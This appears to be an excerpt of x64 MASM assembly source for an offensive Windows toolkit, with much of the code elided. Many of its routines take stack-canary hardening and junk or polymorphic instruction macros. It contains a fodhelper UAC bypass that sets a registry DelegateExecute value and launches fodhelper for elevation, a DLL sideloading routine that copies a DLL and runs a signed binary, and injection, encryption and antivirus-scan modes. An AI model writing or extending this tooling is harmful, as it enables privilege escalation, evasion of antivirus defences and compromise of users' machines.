...
; Usage: Place CANARY_PROLOGUE *after* sub rsp. Stores canary at [rsp] (bottom of frame).
;        Place CANARY_EPILOGUE *before* add rsp / lea rsp. Checks [rsp] again.
;        Both points must have the same RSP value. Uses rbp for XOR (stable).
CANARY_PROLOGUE MACRO
    ;; Store canary at [rsp]: cookie XOR rbp (rbp is stable across the function)
    mov rax, qword ptr [__security_cookie]
    xor rax, rbp
    mov qword ptr [rsp], rax
ENDM

CANARY_EPILOGUE MACRO
    ;; Validate canary at [rsp]: must equal cookie XOR rbp
...
CompileMode PROC
    ...
    ; FRAME prologue for RSP balance and debuggability
    push rbp
    mov rbp, rsp
    POLYMACRO
    sub rsp, 80h  ; 32 shadow + 6 stack params (48) + 8 canary + 8 alignment = 0x80
                   ; RSP is now 16-byte aligned: call(8) + push rbp(8) + 0x80 = 0x90 (144)
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)
    ...
    ; Zero-initialize STARTUPINFO (104 bytes)
    lea rcx, StartupInfo
    mov rdx, STARTUPINFO_SIZE
    xor rax, rax
    call memset
    ; Set cb field (first DWORD of STARTUPINFO) = 104 = 68h
    mov dword ptr [StartupInfo], 68h
    
    ; Zero-initialize PROCESS_INFORMATION (24 bytes)
    lea rcx, ProcessInfo
    mov rdx, PROCESS_INFORMATION_SIZE
    xor rax, rax
    call memset
    ...
    ; x64 ABI: RCX=p1, RDX=p2, R8=p3, R9=p4, [RSP+20h]=p5 ... [RSP+48h]=p10
    lea rcx, szML64Path           ; param 1: lpApplicationName
    lea rdx, szML64Args            ; param 2: lpCommandLine
    xor r8, r8                     ; param 3: lpProcessAttributes = NULL
    xor r9, r9                     ; param 4: lpThreadAttributes = NULL (shadow slot 4 at [RSP+18h])
    mov qword ptr [rsp+20h], 0     ; param 5: bInheritHandles = FALSE  ([RSP+32])
    mov qword ptr [rsp+28h], 0     ; param 6: dwCreationFlags = 0
    mov qword ptr [rsp+30h], 0     ; param 7: lpEnvironment = NULL
    mov qword ptr [rsp+38h], 0     ; param 8: lpCurrentDirectory = NULL
    lea rax, StartupInfo
    mov qword ptr [rsp+40h], rax   ; param 9: lpStartupInfo
    lea rax, ProcessInfo
    mov qword ptr [rsp+48h], rax   ; param 10: lpProcessInformation ([RSP+72])
    call CreateProcessA
    test rax, rax
    jz compile_failed
    
    ; Wait for process to complete
    mov rcx, qword ptr [ProcessInfo]   ; hProcess
    mov rdx, INFINITE_WAIT
    call WaitForSingleObject
    
    ; Close process and thread handles
    mov rcx, qword ptr [ProcessInfo]   ; hProcess
    call CloseHandle
    mov rcx, qword ptr [ProcessInfo+8] ; hThread
    call CloseHandle
...
compile_exit:
    CANARY_EPILOGUE  ; Task 13: Validate canary before return
    lea rsp, [rbp]
    pop rbp
    ret
CompileMode ENDP
...
EncryptMode PROC
    ...
    JUNK_INSTR
    sub rsp, 30h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; Shadow space + alignment
...
InjectMode PROC
    ...
    push r12
    sub rsp, 50h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; 3 pushes(24) + 50h(80) = 104 = 8 mod 16 → aligned
...
UACBypassMode PROC
    ...
    push rbx
    sub rsp, 68h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; 2 pushes(16) + 68h(104) = 120 = 8 mod 16 → aligned
    ...
    ; Set the DelegateExecute value for fodhelper bypass
    ...
    mov qword ptr [rsp+28h], 32        ; param 6: cbData
    call RegSetValueExA
    test eax, eax
    jnz uac_setval_fail
    ...
    xor rdx, rdx                       ; param 2: lpOperation = NULL (open)
    lea r8, szFodhelper                ; param 3: lpFile
    xor r9, r9                         ; param 4: lpParameters = NULL
    mov qword ptr [rsp+20h], 0         ; param 5: lpDirectory = NULL
    mov qword ptr [rsp+28h], SW_SHOW   ; param 6: nShowCmd
    call ShellExecuteA
    cmp rax, 32
    ja uac_exec_success
...
szUACSuccessMsg db "UAC Bypass: Fodhelper elevation triggered.", 13, 10, 0
...
SideloadMode PROC
    ...
    JUNK_INSTR
    sub rsp, 30h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; 1 push(8) + 30h(48) = 56 = 8 mod 16 → aligned
    
    lea rcx, szSideloadMsg
    call Print
    
    ; CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists)
    lea rcx, szSideloadDLL        ; param 1: source
    lea rdx, szTargetPath          ; param 2: destination
    xor r8, r8                     ; param 3: bFailIfExists = FALSE (overwrite)
    call CopyFileA
    test rax, rax
    jz sideload_copy_fail
    
    ; ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd)
    xor rcx, rcx                   ; param 1: hwnd = NULL
    xor rdx, rdx                   ; param 2: lpOperation = NULL
    lea r8, szSignedBinary         ; param 3: lpFile
    xor r9, r9                     ; param 4: lpParameters = NULL
    mov qword ptr [rsp+20h], 0     ; param 5: lpDirectory = NULL
    mov qword ptr [rsp+28h], SW_SHOW ; param 6: nShowCmd
    call ShellExecuteA
...
szSideloadSuccessMsg db "Sideload: DLL copied and binary launched.", 13, 10, 0
...
AVScanMode PROC
    ...
    POLYMACRO
    sub rsp, 48h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; 6 pushes(48) + 48h(72) = 120 = 8 mod 16 → aligned
    
    lea rcx, szAVScanMsg
    call Print
    
    ; Step 1: Load target file into FileBuffer
    lea rcx, szAVScanFilePrompt    ; param 1: filename to scan
    lea rdx, FileBuffer            ; param 2: buffer
    mov r8, 65536                  ; param 3: max size
    call ReadFileToBuffer
    test rax, rax
...
EntropyMode PROC
    ; Entropy calculation on a target file (Shannon entropy via CalculateEntropy)
    push rbp
    mov rbp, rsp
    JUNK_INSTR
    push r15
    sub rsp, 38h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; 2 pushes(16) + 38h(56) = 72+8=80 → 0 mod 16 → aligned
    
    lea rcx, szEntropyMsg
    call Print
    
    ; Step 1: Read target file into FileBuffer
    lea rcx, szAVScanFilePrompt    ; reuse scan target filename
    lea rdx, FileBuffer
    mov r8, 65536
    call ReadFileToBuffer
    test rax, rax
...
TraceEngineMode PROC
    ...
    JUNK_INSTR
    sub rsp, 48h
    CANARY_PROLOGUE  ; Task 13: Stack canary (after sub rsp — [rsp] is at final position)  ; 4 pushes(32) + 48h(72) = 104 = 8 mod 16 → aligned
